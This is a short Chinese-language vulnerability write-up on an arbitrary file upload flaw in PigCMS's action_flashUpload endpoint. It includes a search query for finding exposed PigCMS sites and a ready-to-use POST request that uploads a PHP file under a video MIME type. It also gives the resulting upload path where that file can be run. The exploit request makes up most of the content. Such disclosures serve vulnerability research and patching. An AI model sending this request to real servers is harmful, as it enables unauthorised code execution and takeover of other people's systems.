# PigCMS action_flashUpload 任意文件上传漏洞

## 漏洞描述

PigCMS action_flashUpload 方法中存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取到服务器权限

## 漏洞影响

<a-checkbox checked>pigcms</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app.name="PigCMS"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1691722982834-8391fb00-7582-4fc7-95c5-2ebb2c4dcde6.png)

验证POC

```php
POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa

------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv

<?php phpinfo();?>
------aaa
```

![img](../../../.vuepress/public/img/1691723050483-3c961b57-f018-46c5-a6e0-db9af809d26f.png)

```php
/cms/upload/images/2023/08/11/1691722887xXbx.php
```